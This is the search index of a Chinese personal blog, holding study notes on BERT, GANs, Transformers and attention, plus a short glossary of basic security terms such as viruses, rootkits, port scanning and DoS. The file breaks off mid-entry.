<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>静态分析</title>
      <link href="/2024/07/02/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/"/>
      <url>/2024/07/02/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="格论（Lattice-Theory）"><a href="#格论（Lattice-Theory）" class="headerlink" title="格论（Lattice Theory）"></a>格论（Lattice Theory）</h1><h1 id="数据流分析"><a href="#数据流分析" class="headerlink" title="数据流分析"></a>数据流分析</h1>]]></content>
      
      
      
        <tags>
            
            <tag> Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BERT</title>
      <link href="/2024/06/24/BERT/"/>
      <url>/2024/06/24/BERT/</url>
      
        <content type="html"><![CDATA[<blockquote><p>BERT — <strong>B</strong>idirectional <strong>E</strong>ncoder <strong>R</strong>epresentations form <strong>T</strong>ransformers</p></blockquote><h1 id="Self-Supervised-Learning"><a href="#Self-Supervised-Learning" class="headerlink" title="Self-Supervised Learning"></a>Self-Supervised Learning</h1><p>前面几节课程的作业都是 supervised learning，包括：</p><ul><li>COVID-19 Cases Prediction (<code>Regression</code>)</li><li>Phoneme <code>Classification</code></li><li>Image Classification (<code>CNN</code>)</li><li>Classify the speakers of given features (<code>transformer</code>)</li><li>English to Chinese (Traditional) Translation (<code>RNN seq2seq</code>)</li><li>build a generative adversarial  network for anime face generation (<code>GAN</code>)</li></ul><p>这些任务的共同点是都需要有标注好的 label，用于模型输出 $\hat{y}$ 和数据集中标注的正确的 $y$ 进行对比。</p><p>但是如果没有标注好的 label 呢？</p><p>自监督式学习便是做这个工作，在一堆没有被标注的数据 $x$ 中将其分成两部分，一部分作为输入 $x’$，一部分作为 label $x’’$。</p><h1 id="BERT-原理"><a href="#BERT-原理" class="headerlink" title="BERT 原理"></a>BERT 原理</h1><p>Bert 的网络架构和 Transformer 的 Encoder 一模一样，有很多 self-attention，有 residual，有 normalization 等等。</p><p>做的工作便是输入一排 vector，输出一排 vector。</p><h2 id="Masking-Input"><a href="#Masking-Input" class="headerlink" title="Masking Input"></a>Masking Input</h2><p><img src="/../images/bert/1.png"></p><p>最开始用在 NLP 中，输入是一排自然语言。其中 token 的大小是自己定义的。</p><p>在中文人物中，一个 token 就是一个<code>方块字</code>。</p><p>随即 mask 掉一个 token，对于这个位置来说，可以</p><ul><li>使用专门的标志 token 表示该位置被 mask 掉了</li><li>使用一个随即的 token 代替该位置（如别的随机汉字）</li></ul><p>被 mask 位置经过模型输出一个 vector，再做一个 linear 变换后通过 softmax 得到一个很长的 sequence，里面是对于该位置可能的预测。</p><p>目标是将输出的汉字与 Ground Truth 的汉字作交叉熵并且最优化该损失函数。</p><p><img src="/../images/bert/2.png"></p><p>​</p><h2 id="Next-Sentence-Prediction"><a href="#Next-Sentence-Prediction" class="headerlink" title="Next Sentence Prediction"></a>Next Sentence Prediction</h2><p>判断句子 B 是否是句子 A 的下文。如果是的话输出 Yes，否则输 No。</p><p><img src="/../images/bert/3.png"></p><h2 id="预训练"><a href="#预训练" class="headerlink" title="预训练"></a>预训练</h2>]]></content>
      
      
      
        <tags>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GAN—生成式对抗网络</title>
      <link href="/2024/06/10/GAN%E2%80%94%E7%94%9F%E6%88%90%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C/"/>
      <url>/2024/06/10/GAN%E2%80%94%E7%94%9F%E6%88%90%E5%AF%B9%E6%8A%97%E7%BD%91%E7%BB%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="Network-v-s-Generator"><a href="#Network-v-s-Generator" class="headerlink" title="Network v.s. Generator"></a>Network v.s. Generator</h1><p>网络和生成器是两种东西。</p><h2 id="传统-Network"><a href="#传统-Network" class="headerlink" title="传统 Network"></a>传统 Network</h2><p>是一个 function，给定一个 $x$，输出一个 $y$。</p><p>这个 $x$ 可以是一个图片，可以是一个 sequence。</p><p>输出的 $y$ 可以是一个数值，也可以是一个 label。</p><h2 id="Generator"><a href="#Generator" class="headerlink" title="Generator"></a>Generator</h2><p>将 network 当成 generator 使用。</p><p><img src="/../images/gan/1.png"></p><p>这里的网络输入除了常规的 $x$ 之外，还有一个从<code>已知分布</code>中 sample 出来的 $z$。</p><p>这个分布可以是高斯分布，可以是均匀分布，只要求这个分布的公式能够写出来。</p><p>此时的模型输出就不是单一的东西了，变成了一个复杂的分布。</p><p>为什么需要输入从一个简单的分布中采样呢？</p><p>为什么需要输出一个分布呢？</p><blockquote><p>随机性</p></blockquote><h2 id="小精灵的例子"><a href="#小精灵的例子" class="headerlink" title="小精灵的例子"></a>小精灵的例子</h2><p><img src="/../images/gan/2.png"></p><p>在这个小精灵游戏的例子中，需要根据前面画面的 frame 预测下一个 frame 是什么样的。</p><p>然后游戏情节的推动并不是单一线性的，小精灵可能<code>向左转</code>也可能<code>向右转</code>。</p><p>因此训练集中会对于同一个输入有多个不同的 label，导致输出是多样的。</p><p>因此需要在网络中加入概率成分 $z$，使得输出是一个概率分布，使得输出<em>并不是固定的</em>。</p><p>比如当 $z$ sample 到 0 的时候就左转，sample 到 1 的时候右转，从而模拟不可预测的情况。</p><p>主要用在需要有创造力的地方，同一个输入可以有不同的正确的输出。</p><p>AIGC 场景、对话场景。</p><p><img src="/../images/gan/3.png"></p><h1 id="GAN"><a href="#GAN" class="headerlink" title="GAN"></a>GAN</h1><h2 id="Discriminator"><a href="#Discriminator" class="headerlink" title="Discriminator"></a>Discriminator</h2><p>discriminator 用于找出输入和 label 之间的差别，促使下一次 generaotr 可以生成更好的东西。</p><p>discriminator 也是一个神经网络，可以是 CNN，也可以是 Transformer，由自己设计。</p><p><img src="/../images/gan/4.png"></p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>记号：</p><p>$G \leftarrow Generator$</p><p>$D \leftarrow Discriminator$ </p><p>先初始化这两个模型里面的参数</p><p>后面每一轮都重复下面的步骤。</p><h3 id="1-固定-G-，更新-D"><a href="#1-固定-G-，更新-D" class="headerlink" title="1. 固定 $G$，更新 $D$"></a>1. 固定 $G$，更新 $D$</h3><p>sample 一堆向量丢给 $G$，此时会生成一堆杂乱无章的图像。</p><p>拿这些杂乱无章的图像和数据集中正常的二次元图像去训练 $D$。</p><p>训练 $D$ 可以用 classification 去做，也可以用 regression 去做。</p><ul><li>classfication<ul><li>将正常的图片标记为 1，将 $G$ 生成的标记为 0，训练一个网络 $D$ 来做分类。</li></ul></li><li>regression<ul><li>看到正常的图片输出 1，看到 $G$ 生成的标记为 0，训练一个网络 $D$ 来做回归。</li></ul></li></ul><p>从而让 $D$ 学会<strong>分辨</strong>正常图片和 $G$ 生成的青春版图片之间的<strong>差异</strong>。</p><p><img src="/../images/gan/5.png"></p><h3 id="2-固定-D-，更新-G"><a href="#2-固定-D-，更新-G" class="headerlink" title="2. 固定 $D$，更新 $G$"></a>2. 固定 $D$，更新 $G$</h3><p>想办法让 $G$ 骗过 $D$。</p><p>调整 $G$ 的参数使得 $D$​ 输出的<strong>打分越大越好</strong>。</p><p>训练 $G$ 的过程和平时训练神经网络没有什么差异，都是设置一个 loss，跑梯度下降等。</p><p>目标就是最大化 $D$ 的输出。</p><p><img src="/../images/gan/6.png"></p><h2 id="理论原理"><a href="#理论原理" class="headerlink" title="理论原理"></a>理论原理</h2><p>在 GAN 的这个工作中，我们要优化的是一个什么东西？</p><p><img src="/../images/gan/7.png"></p><p>从 $Normal\ Distribution$ 中 sample 出来一些随机的 vector 丢给 $G$，$G$ 产生一个图像的分布 $P_G$。</p><p>目前有一个真实的数据集 $P_{data}$，我们想要 $P_G$ 和 $P_{data}$ 越接近越好。</p><p>写成公式也就是要找一个 $G$：$G^{<em>} &#x3D; \underset{G}{\arg \min} \ Div(P_G, P_{data})$，这和传统的 $w^</em>, b^* &#x3D; \underset{w, b}{\arg \min}$ （c.f.）是如出一辙的。</p><p>如何计算这个 divergence？</p><h3 id="Divergence-的计算"><a href="#Divergence-的计算" class="headerlink" title="Divergence 的计算"></a>Divergence 的计算</h3><p>不需要知道 $P_G$ 和 $P_{data}$​ 具体的 formulation 长什么样子，但是只要能够 sample，就能够计算 divergence。</p><p>sample 的方式如下：</p><p><img src="/../images/gan/8.png"></p><blockquote><p>接下来就要靠 $D$ 的帮助了。</p></blockquote><p>在训练 $D$ 的时候，看到 smaple 的 data 就打低分，看到真实的的 data 就打高分。</p><p><img src="/../images/gan/9.png"></p><p>这个过程可以抽象成公式：$D^* &#x3D; \underset{D}{\arg \max} V(D, G)$​。</p><p>这个 $V(D, G)$​ 和 <code>js divergence</code> 有关联。</p><blockquote><p>Jensen-Shannon Divergence</p><p>Jensen-Shannon 分歧 (JS) 衡量不同分面的标签分布之间的相互偏离程度。它基于 Kullback-Leibler 分歧，但具有对称性。</p><p>Jensen-Shannon 分歧的公式如下：</p><p>​    $JS &#x3D; ½ * [KL(P_a || P) + KL(P_d || P)]$</p><p>其中 P &#x3D; ½( Pa + Pd )，即分面 <em>a</em> 和 <em>d</em> 的平均标签分布情况。</p><p>二进制、多类别、连续结果的 JS 值范围为 [0, ln(2))。</p><ul><li>接近零的值意味着标签的分布情况相似。</li><li>正值表示标签分布存在差异，正值越大，差异就越大。</li></ul><p>该指标指示某个标签在各分面之间是否存在较大差异。</p><p>参考：<a href="https://docs.aws.amazon.com/zh_cn/sagemaker/latest/dg/clarify-data-bias-metric-jensen-shannon-divergence.html">https://docs.aws.amazon.com/zh_cn/sagemaker/latest/dg/clarify-data-bias-metric-jensen-shannon-divergence.html</a></p></blockquote><p>这里需要优化的目标即：$V(D, G) &#x3D; E_{y \sim P_{data}}[\log D(y)] + E_{y \sim P_G}\log (1 - D(y))$，即在做一个交叉熵损失函数的最优化问题。</p><p>如果希望优化目标 <code>越大越好</code>，那么就需要 $\log D(y)$ <code>越大越好</code>（$P_{data}$ 中 sample 出来的），$\log (1 - D(y))$ <code>越小越好</code> （$P_G$ 中 sample 出来的）。</p><p><img src="/../images/gan/10.png"></p><p>如果是 small divergence, $D$ 很难分辨两种 sample 出来的 data 的差异，因此在最优化的时候 $V(D, G)$ 很难达到一个很大的数值，因此结果比较小。</p><p>也就是在穷举 $\max V(D, G)$ 的时候可以得到的<code>最大值</code>比较<strong>小</strong>。</p><p>如果是 large divergence，优化的目标函数最大值就可以很大。</p><p>因此，可以直接使用 $D$ 中的的 $\max V(D, G)$ 替换 $G$ 中的 $V(D, G)$，步骤如下所示：</p><p>$G^{<em>} &#x3D; \underset{G}{\arg \min} \ Div(P_G, P_{data})\D^</em> &#x3D; \underset{D}{\arg \max} V(D, G)\G^{*} &#x3D; \underset{G}{\arg \min} \max V(D, G)$</p><p>即 $Div(P_G, P_{data}) &#x3D; \max V(D, G)$。</p><h3 id="WGAN-的计算"><a href="#WGAN-的计算" class="headerlink" title="WGAN 的计算"></a>WGAN 的计算</h3><p>我没听懂为什么要计算 Wasserstein DIstance。</p><p>计算公式为：$\underset{D \in 1 - Lipschitz}{\max} {E_{y \sim P_{data}}[D(x)] - E_{y \sim P_G}[D(x)]}$。</p><p>$D$ 需要是一个平滑的函数。</p>]]></content>
      
      
      
        <tags>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Transformer</title>
      <link href="/2024/06/09/Transformer/"/>
      <url>/2024/06/09/Transformer/</url>
      
        <content type="html"><![CDATA[<h1 id="intro"><a href="#intro" class="headerlink" title="intro"></a>intro</h1><h2 id="什么是-Transformer"><a href="#什么是-Transformer" class="headerlink" title="什么是 Transformer"></a>什么是 Transformer</h2><p>Transformer 是一个 sequence to sequence（<code>Seq2seq</code>） 的模型。</p><ul><li>input: sequence</li><li>output: sequence，我们不知道输出的长度，需要模型自己来决定</li></ul><h2 id="Seq2seq-的例子"><a href="#Seq2seq-的例子" class="headerlink" title="Seq2seq 的例子"></a>Seq2seq 的例子</h2><ul><li>语音识别<ul><li>10 段音频 vector $\to$ 你好吗</li><li>这里的输入是由 10 段 vector 组成的 sequence，输出是由三个中文字符，或者说三个 vector 组成的 sequence</li></ul></li><li>机器翻译<ul><li>Hello $\to$ 你好</li><li>这里的输入是 5 个拉丁字母，输出是两个中文字符</li></ul></li><li>语音翻译<ul><li>10 段音频 vector（Hello 的英文） $\to$ 你好（中文字符）</li></ul></li><li>语音合成<ul><li>输入文字，输出声音信号</li></ul></li><li>很多 NLP 任务都可以抽象成 QA</li><li>Multi-label Classification<ul><li>同一个物体可以被分类为多个标签</li><li>和 multi-class classification 的区别：传统多分类问题，一个物体被分在多个 class 中的其中一个</li><li>机器自己决定输出给一个物体输出多少个类别</li></ul></li></ul><h1 id="Seq2seq-模型"><a href="#Seq2seq-模型" class="headerlink" title="Seq2seq 模型"></a>Seq2seq 模型</h1><p>一般的 Seq2seq 模型都是 Encoder-Decoder 架构。</p><p>数据流向为 $input \to Encoder \to Decoder \to output$。</p><h2 id="Encoder"><a href="#Encoder" class="headerlink" title="Encoder"></a>Encoder</h2><p>一个简化版本的 Encoder 如下：</p><p><img src="/../images/transformer/1.png"></p><p>首先是有一排输入 vector,将他们丢入 Encoder。</p><p>这个 Encoder 会做一些事情，比如做一个 Self-attention，然后将输出再送入全连接神经网络，最后给出输出。</p><p>但是在 Transformer 原文里 Encoder 做的事情要更复杂，如下图。</p><p><img src="/../images/transformer/2.png"></p><ul><li>对输入向量 $b$ 做 Self-attention，得到输出向量 $a$</li><li>做 $a + b$（<code>residual connection</code>），得到输出 $c$</li><li>做 $norm(c)$，即对 $c$ 做 <em>Layer normalization</em>，得到输出 $d^{‘’}$<ul><li>normalization 做的是将数据变换到 0 期望 1 标准差</li><li>$Mean: \ \mu^l &#x3D; \frac{1}{H}\sum_{i &#x3D; 1}{H}a^l_i$</li><li>$Standard Deviation: \ \sigma^l; &#x3D; \sqrt{\frac{1}{H}\sum_{i &#x3D; 1}^{H}(a^l_i - \mu^l)^2}$</li><li>$d^{l’} &#x3D; \frac{x^l - \mu^l}{\sigma^l + \epsilon}$</li></ul></li><li>送入全连接神经网络，得到输出 $e$</li><li>做 $d + e$，得到新向量 $f$</li><li>将 $f$ 再做一次 <em>Layer normalization</em>，得到输出</li></ul><h2 id="Decoder"><a href="#Decoder" class="headerlink" title="Decoder"></a>Decoder</h2><h3 id="Autogressive-AT"><a href="#Autogressive-AT" class="headerlink" title="Autogressive (AT)"></a>Autogressive (AT)</h3><p><img src="/../images/transformer/3.png"></p><p>这里的 Decoder 和 Encoder 的区别仅仅是中间加了一个 <em>Multi-Head Attention</em> 层，并且在第一个注意力模块做了一个 Mask，在输出多了一层 <em>Linear</em> 和 <em>softmax</em>。</p><p> <img src="/../images/transformer/4.png"></p><p>这里 Masked 多头注意力做的是 Corss-attention（交叉注意力）。</p><p>先有的交叉注意力，再有的 transformer 论文里的 Self-attention。</p><p>之所以是要做 mask，是因为新 vector 的产生是不能关注到其后面的输入，这是因为在生成的时候是<em>一个一个</em>产生的，</p><p>对于 Decoder 而言，在生成当前 vector 的时候后面的 vector 还没有被生成，因此需要 mask 掉后面的输入。</p><p> <img src="/../images/transformer/5.png"></p><p>在 AT 模型中，每一个输出都是串行产生的，并且前一个输出会作为 Decoder 的下一个输入。</p><p>Decoder 的第一个输入是一个 START 标志，代表开始。</p><p>同时模型也需要学会何时产生 END 标志，表示输出 sequence 的结束。</p><p>因此这种模型我们并不知道 Decoder 会输出多少个 vector，一切都是模型自己学习得到的。</p><h3 id="Non-Autoregressive-NAT"><a href="#Non-Autoregressive-NAT" class="headerlink" title="Non-Autoregressive (NAT)"></a>Non-Autoregressive (NAT)</h3><p>NAT 模型下我们会人工指定输出的 vector 数量，有可能是预测不超过 $x$ 个输出，因此指定 $x$ 个 START 标志作为输入。</p><p>最后 Decoder 会对于每一个 START input 产生一个输出，一旦发现了 END 标志则后面所有的都当成无用输出。</p><p><img src="/../images/transformer/6.png"></p><h3 id="训练"><a href="#训练" class="headerlink" title="训练"></a>训练</h3>]]></content>
      
      
      
        <tags>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>注意力机制</title>
      <link href="/2024/06/08/%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/"/>
      <url>/2024/06/08/%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="Vector-as-Input"><a href="#Vector-as-Input" class="headerlink" title="Vector as Input"></a>Vector as Input</h1><h2 id="输入向量"><a href="#输入向量" class="headerlink" title="输入向量"></a>输入向量</h2><p>在诸如 CNN 这种神经网络中，传统的模型输入基本都是一条长向量就可以表示所有的信息。</p><p>但是在像自然语言处理中输入的一段话是一个 sequence，这个 sequence 中每个单词都是一个 vector，而且是不定长的。</p><ul><li>句子<ul><li>sequence：完整的句子</li><li>vector：单词</li></ul></li><li>语音信号<ul><li>sequence：完整的语音</li><li>vector：一段时间内采样的语音片段</li></ul></li><li>社交网络<ul><li>sequence：整个网络</li><li>vector：网络中的某个结点（描述一个个体的年龄、性别、职业等）</li></ul></li><li>分子<ul><li>sequence：整个分子</li><li>vector：分子中的某个球（原子）</li></ul></li></ul><p>这些问题都可以建模成 <em>vector set as input</em> 的模型输入。</p><h2 id="输出形式"><a href="#输出形式" class="headerlink" title="输出形式"></a>输出形式</h2><p><img src="/../images/attention/12.png"></p><ul><li>$n$ 个向量 $\to$ $n$ 个标签<ul><li>词性标注</li></ul></li><li>$n$ 个向量 $\to$ $1$ 个标签<ul><li>情感分析</li></ul></li><li>$n$ 个向量 $\to$ $n^{‘}$ 个标签<ul><li><code>seq2seq</code> 问题，生成的结果是不定长的</li><li>机器翻译、语音识别</li></ul></li></ul><p>由于 sequence 的长度原因，一个模型的输入往往不可能一次囊括所有信息。</p><p>因此需要在某个 vector 的上下文中学习有关的信息。</p><p>但是这个上下文中有的信息是重要的，有的是不重要的，因此出现了 attention 来计算其他 vector 和当前 vector 的关联度。</p><h1 id="Self-attention"><a href="#Self-attention" class="headerlink" title="Self-attention"></a>Self-attention</h1><h2 id="如何产生关联上下文语境的输出"><a href="#如何产生关联上下文语境的输出" class="headerlink" title="如何产生关联上下文语境的输出"></a>如何产生关联上下文语境的输出</h2><p>假设模型有四个输入：$a^1, a^2, a^3, a^4$，目的是得到四个输出 $b^1, b^2, b^3, b^4$。</p><p>其中，$a^i$ 是一个向量，代表一个单词，比如 $dog$。</p><p>对于 $a^1$，在 $a^i, i \in [2, 3, 4]$ 中，找出和 $a^1$ 的相关性 $\alpha$，</p><p>即找出哪几个向量和 $a^1$​ 的相关度最大，最重要。</p><h2 id="alpha-的计算方法"><a href="#alpha-的计算方法" class="headerlink" title="$\alpha$ 的计算方法"></a>$\alpha$ 的计算方法</h2><h3 id="Dot-Product-点积注意力"><a href="#Dot-Product-点积注意力" class="headerlink" title="Dot-Product - 点积注意力"></a>Dot-Product - 点积注意力</h3><ul><li>存在两个矩阵 $W^q$ 和 $W^k$，做 $W^q \cdot a^1 &#x3D; q$ 和 $W^k \cdot a^1 &#x3D; k$。</li><li>作 $q \cdot k &#x3D; \alpha$。</li></ul><h3 id="Additive-加性注意力"><a href="#Additive-加性注意力" class="headerlink" title="Additive - 加性注意力"></a>Additive - 加性注意力</h3><ul><li>存在两个矩阵 $W^q$ 和 $W^k$，做 $W^q \cdot a^1 &#x3D; q$ 和 $W^k \cdot a^1 &#x3D; k$​。</li><li>作 $W^v \cdot tanh(q + k)$。</li></ul><p><img src="/../images/attention/3.png"></p><h2 id="计算所有向量之间的关联度-alpha"><a href="#计算所有向量之间的关联度-alpha" class="headerlink" title="计算所有向量之间的关联度 $\alpha$"></a>计算所有向量之间的关联度 $\alpha$</h2><p>对每个 vector 都作关联度计算，并送入 softmax，</p><h3 id="计算-Q"><a href="#计算-Q" class="headerlink" title="计算 Q"></a>计算 Q</h3><p>$q^1 &#x3D; W^q \cdot a^1$ — query vector</p><h3 id="计算-K"><a href="#计算-K" class="headerlink" title="计算 K"></a>计算 K</h3><p>$k^i &#x3D; W^k \cdot a^i$​ — key vector</p><h3 id="计算-alpha-（Attention-Score）"><a href="#计算-alpha-（Attention-Score）" class="headerlink" title="计算 $\alpha$ （Attention Score）"></a>计算 $\alpha$ （Attention Score）</h3><p>$\alpha_{1, i} &#x3D; q^1 \cdot k^i$​</p><p>$\alpha_{1, i}^{‘} &#x3D; softmax(\alpha_{1, i})&#x3D; \frac{e^{\alpha}}{\sum_j {e^{\alpha_{1, j}}}}$，代表模型在 $\alpha_1$ 这个位置对输入信息 $\alpha_{1}$ 和 $\alpha_{2}$ 需要给予的关注程度。(<code>attention score</code>) </p><p><img src="/images/attention/4.png"></p><p>最后也不一定用 softmax，但这个是最常见的。</p><h3 id="计算-V"><a href="#计算-V" class="headerlink" title="计算 V"></a>计算 V</h3><p>再引入一个新的矩阵 $W^v$，和每个 $\alpha$ 作点积，即 $v^i &#x3D; W^v \cdot \alpha^i$​ — <code>value vector</code>。</p><h3 id="计算打分"><a href="#计算打分" class="headerlink" title="计算打分"></a>计算打分</h3><p>将这个 $v_i$ 和每个 $\alpha$ 作点积，计算 $b^1 &#x3D; \sum_i{\alpha^{‘}_{1, i}v^i}$，最后得到的 $\vec{b}$ 是一个四维向量，也就是 Attention 的输出。</p><p><img src="/../images/attention/5.png"></p><h2 id="从矩阵形状的角度理解"><a href="#从矩阵形状的角度理解" class="headerlink" title="从矩阵形状的角度理解"></a>从矩阵形状的角度理解</h2><blockquote><p>存在四个输入向量 $a_1, a_2, a_3, a_4$.</p></blockquote><h3 id="计算-Q、K、V"><a href="#计算-Q、K、V" class="headerlink" title="计算 Q、K、V"></a>计算 Q、K、V</h3><p><img src="/../images/attention/6.png"></p><h3 id="计算-alpha-（Attention-Score）-1"><a href="#计算-alpha-（Attention-Score）-1" class="headerlink" title="计算 $\alpha$ （Attention Score）"></a>计算 $\alpha$ （Attention Score）</h3><p><img src="/../images/attention/7.png"></p><h3 id="计算-Attention-输出"><a href="#计算-Attention-输出" class="headerlink" title="计算 Attention 输出"></a>计算 Attention 输出</h3><p><img src="/../images/attention/8.png"></p><h1 id="Multi-head-Self-attention"><a href="#Multi-head-Self-attention" class="headerlink" title="Multi-head Self-attention"></a>Multi-head Self-attention</h1><p>Q、K、V 分叉，产生多个子 q、k、v。</p><p>具体分几个 head 这个是个超参数，需要经验上去调。</p><p>以双头注意力为例，需要对一个 <code>query</code> 和其他每个 <code>key</code> 计算两次关联度。</p><p>对于输入向量 $a^i$ 首先是使用两个不同的权重矩阵去做乘法，得到两个分叉后的 q。</p><p><img src="/../images/attention/9.png"></p><p><img src="/../images/attention/10.png"></p><h1 id="Position-Encoding"><a href="#Position-Encoding" class="headerlink" title="Position Encoding"></a>Position Encoding</h1><p>在 Self-attention 中没有使用 position 的信息，所有 vector 在 sequence 中的 position 都没有差别。</p><p>但是比如一个句子中，动词放在句首的概率是比较小的。</p><p>为每个位置设置一个专属的 positional vector  $e^i$。</p><p><img src="/../images/attention/11.png"></p><h1 id="Self-attention-的应用"><a href="#Self-attention-的应用" class="headerlink" title="Self-attention 的应用"></a>Self-attention 的应用</h1><ul><li><p>Speech</p></li><li><p>Image</p><ul><li>Self-Attention GAN</li><li>DEtection Transformer (DETR)</li></ul></li><li><p>NLP</p></li></ul><h2 id="Self-attention-v-s-CNN"><a href="#Self-attention-v-s-CNN" class="headerlink" title="Self-attention v.s. CNN"></a>Self-attention v.s. CNN</h2><p>CNN 可以看作简化版本的 Self-attention，因为 CNN 只关注一个 <code>receptive field</code> 中的像素信息，非常局限。</p><p>Self-attention 可以自己学习 receptive field，找出来哪些感受野是重要的，相关的。</p><blockquote><p>On the Relationship between Self-Attention and Convolutional Layers</p></blockquote><p>Self-attention 弹性大，需要比较大的训练数据，因此</p><ul><li>在数据量大的时候效果更好</li><li>在数据量小的时候容易  over-fitting</li></ul><p>CNN 弹性比价小，因此</p><ul><li>在数据量小的时候效果更好</li><li>在数据量大的是时候 欠拟合</li></ul><blockquote><p>An Image is Worth 16x16 Words: Transformers for Image Recognition at Scale</p></blockquote><h2 id="Self-attention-v-s-RNN"><a href="#Self-attention-v-s-RNN" class="headerlink" title="Self-attention v.s. RNN"></a>Self-attention v.s. RNN</h2><p>RNN 和 Self-attention 一样都是处理 input 是一个 sequence 的情景。</p><ul><li>RNN 处理当前输入 vector $\vec{v_1}$ $\to$ 输出新的 vector $\vec{v_2}$<ul><li><ol><li>$\vec{v_2}$ 被送入全连接神经网络学习</li></ol></li><li><ol start="2"><li>$\vec{v_2}$ 送入下一个 RNN 模块，并且结合下一个输入</li></ol></li></ul></li></ul><p>每个 RNN 模块都会考虑当前输入 vector 以及上一个 RNN 模块输出的 vector。</p><p>RNN 也可以是双向的，考虑整个 input sequence。</p><p><img src="/../images/attention/13.png"></p><p>Self-attention 的好处：</p><ul><li>K、Q 的匹配计算不用考虑距离<ul><li>RNN 需要在内存存储前面的输出，直到计算到最后一个位置才被拿出来使用</li></ul></li><li>并行化<ul><li>所有的 output sequence 都是同时产生的</li></ul></li></ul><blockquote><p>Transformers are RNNs: Fast Autoregressive Transformers with Linear Attention</p></blockquote><h2 id="Self-attention-4-Graph（GNN）"><a href="#Self-attention-4-Graph（GNN）" class="headerlink" title="Self-attention 4 Graph（GNN）"></a>Self-attention 4 Graph（GNN）</h2><ul><li>Graph<ul><li>Node</li><li>Edge</li></ul></li></ul><p>只计算相连的 node 之间的 attention score。</p><p><img src="/../images/attention/14.png"></p><h3 id="Much-More"><a href="#Much-More" class="headerlink" title="Much More"></a>Much More</h3><p>long Range Arena: A Benchmark for Efficient Transformers</p><p>Efficient Transformers: A Survey</p><p>平衡计算速度、性能。</p><h1 id="Attention-Self-attention"><a href="#Attention-Self-attention" class="headerlink" title="Attention &amp; Self-attention"></a>Attention &amp; Self-attention</h1><p>Self-attention 机制在 KQV 模型中的特殊点在于 <em>Q &#x3D; K &#x3D; V</em>，这也是为什么取名 Self-attention，</p><p>因为其是<code>文本和文本自己</code>求相似度（$\alpha &#x3D; Q \cdot K$）再<code>和文本本身</code>相乘（$\alpha \cdot V$）计算得来。</p>]]></content>
      
      
      
        <tags>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全快速扫盲</title>
      <link href="/2024/05/23/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%BF%AB%E9%80%9F%E6%89%AB%E7%9B%B2/"/>
      <url>/2024/05/23/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%BF%AB%E9%80%9F%E6%89%AB%E7%9B%B2/</url>
      
        <content type="html"><![CDATA[<h1 id="网络安全-系统安全"><a href="#网络安全-系统安全" class="headerlink" title="网络安全&#x2F;系统安全"></a>网络安全&#x2F;系统安全</h1><h2 id="病毒"><a href="#病毒" class="headerlink" title="病毒"></a>病毒</h2><blockquote><p>可以自我复制的程序。</p></blockquote><h2 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h2><blockquote><p>表面看起来没有问题，但是含有恶意代码。</p><p>通过木马传播的计算机病毒非常常见。</p></blockquote><h2 id="rootkit"><a href="#rootkit" class="headerlink" title="rootkit"></a>rootkit</h2><blockquote><p>一个工具集合，用于掩盖其入侵并提权行为的工具集。</p><ol><li>通过已知漏洞或破解口令 -&gt; 获取用户级访问权限</li><li>安装 rootkit</li></ol></blockquote><h2 id="白帽黑客攻击-渗透测试"><a href="#白帽黑客攻击-渗透测试" class="headerlink" title="白帽黑客攻击 &amp; 渗透测试"></a>白帽黑客攻击 &amp; 渗透测试</h2><blockquote><p> 对组织的系统安全性进行测试。</p></blockquote><h5 id="Shadon"><a href="#Shadon" class="headerlink" title="Shadon"></a>Shadon</h5><blockquote><p>漏洞搜索引擎。</p></blockquote><h2 id="黑帽黑客"><a href="#黑帽黑客" class="headerlink" title="黑帽黑客"></a>黑帽黑客</h2><blockquote><p> 使用黑客技术进行非法活动。</p></blockquote><h2 id="灰帽黑客"><a href="#灰帽黑客" class="headerlink" title="灰帽黑客"></a>灰帽黑客</h2><blockquote><p>曾经是黑帽子，后来变成了白帽子。</p></blockquote><h2 id="脚本小子"><a href="#脚本小子" class="headerlink" title="脚本小子"></a>脚本小子</h2><blockquote><p>随着黑客工具的泛滥，有人下载了工具进行网络工具但是没有了解工具的具体情况。</p></blockquote><h2 id="红队-蓝队"><a href="#红队-蓝队" class="headerlink" title="红队 &amp; 蓝队"></a>红队 &amp; 蓝队</h2><p>红队：进行渗透测试，模拟对手的攻击行为。</p><blockquote><p>蓝队：组织红队进攻的防守队伍。</p></blockquote><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><blockquote><p>连接目标系统上的每个端口并查看有哪些端口是打开的。</p></blockquote><ul><li>ping 扫描</li><li>连接扫描</li><li>SYN 扫描 -&gt; 泛洪DOS攻击</li><li>FIN 扫描</li></ul><h2 id="漏洞评估"><a href="#漏洞评估" class="headerlink" title="漏洞评估"></a>漏洞评估</h2><blockquote><p>利用工具对系统评估，检测是否容易收到特定的攻击。</p></blockquote><h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><blockquote><p>查明目标系统中所有的内容，如一个网络中所有的服务器、计算机、打印机等。</p></blockquote><h2 id="DOS攻击（拒绝服务攻击）"><a href="#DOS攻击（拒绝服务攻击）" class="headerlink" title="DOS攻击（拒绝服务攻击）"></a>DOS攻击（拒绝服务攻击）</h2><blockquote><p>不会试图入侵系统而是组织合法用户对系统进行访问。</p></blockquote><h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" 